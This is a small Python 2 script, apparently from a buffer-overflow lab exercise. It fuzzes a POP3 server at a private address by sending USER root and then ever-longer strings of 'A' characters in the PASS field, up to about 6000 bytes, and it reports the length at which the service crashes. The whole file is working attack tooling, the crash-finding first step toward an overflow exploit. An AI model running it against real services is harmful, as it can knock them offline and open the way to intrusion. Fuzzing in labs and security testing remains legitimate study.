#!/usr/bin/env python
"""
🐌 Incremental Fuzzer
A simple fuzzer loop that increases payload size. 📈
Good for finding the initial crash point! 💥
"""

import socket

def incremental_fuzz():
    # 🎯 Target Info
    target_ip = '192.168.250.137'
    target_port = 110
    
    buffer_list = ["A"]
    counter = 100
    
    # 🏭 Generate Buffer List
    # Increases by 200 bytes each step until it hits ~6000 bytes
    while len(buffer_list[-1]) <= 6000:
        buffer_list.append("A" * counter)
        counter += 200
        
    print "\n🐌 Incremental Fuzzer Initialized!"
    print "   🎯 Target: " + target_ip + ":" + str(target_port)
    print "   📦 Max Buffer Size: " + str(len(buffer_list[-1]))

    for string in buffer_list:
        try:
            print "   📡 Fuzzing with length: " + str(len(string)) + " bytes"
            
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3) # Timeout to detect crash
            s.connect((target_ip, target_port))
            
            s.recv(1024)
            s.send('USER root\r\n')
            s.recv(1024)
            
            s.send('PASS ' + string + '\r\n')
            s.send('QUIT\r\n')
            s.close()
            
        except Exception as e:
            print "\n   💥 CRASH DETECTED/TIMEOUT!"
            print "   💀 Length that crashed it: " + str(len(string))
            print "   ❌ Error: " + str(e)
            break

if __name__ == "__main__":
    incremental_fuzz()
